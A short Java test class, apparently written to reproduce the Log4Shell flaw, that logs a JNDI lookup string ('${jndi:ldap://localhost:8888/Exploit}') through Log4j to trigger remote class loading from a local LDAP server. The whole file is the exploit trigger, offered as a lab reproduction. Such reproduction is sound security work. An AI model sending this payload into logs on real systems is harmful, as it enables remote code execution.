import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author cr
 * @date 2021/12/20 14:39
 */
public class LogTest {
    public static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        logger.error("${jndi:ldap://localhost:8888/Exploit}");
    }
}
